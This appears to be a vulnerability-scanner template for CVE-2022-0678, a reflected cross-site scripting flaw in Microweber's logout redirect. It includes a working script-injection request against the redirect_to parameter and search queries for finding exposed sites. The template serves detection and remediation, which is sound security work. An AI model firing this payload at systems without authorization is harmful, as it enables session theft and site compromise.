id: CVE-2022-0678

info:
  name: Microweber <1.2.11 - Cross-Site Scripting
  author: tess,co5mos
  severity: medium
  description: |
    Packagist prior to 1.2.11 contains a cross-site scripting vulnerability via microweber/microweber. User can escape the meta tag because the user doesn't escape the double-quote in the $redirectUrl parameter when logging out.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Upgrade Microweber CMS to version 1.2.11 or later, which includes a fix for this vulnerability.
  reference:
    - https://huntr.dev/bounties/d707137a-aace-44c5-b15c-1807035716c0/
    - https://twitter.com/CVEnew/status/1495001503249178624?s=20&t=sfABvm7oG39Fd6rG44vQWg
    - https://huntr.dev/bounties/d707137a-aace-44c5-b15c-1807035716c0
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0678
    - https://github.com/microweber/microweber/commit/2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-0678
    cwe-id: CWE-79
    epss-score: 0.00138
    epss-percentile: 0.49247
    cpe: cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: microweber
    product: microweber
    shodan-query:
      - http.favicon.hash:780351152
      - http.html:"microweber"
    fofa-query:
      - body="microweber"
      - icon_hash=780351152
  tags: cve,cve2022,huntr,xss,microweber

http:
  - method: GET
    path:
      - '{{BaseURL}}/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '><script>alert(document.domain)</script>'
          - 'content="Microweber"'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 404
# digest: 4a0a0047304502200caa72a848cf40c8c5d4e9922355f0cf4a37acc8500555ec811a66301679cc8f022100ecd7671a9bc34d9840acc4912e169196492e49db5af42192815ad531afba72fa:922c64590222798bb761d5b6d8e72950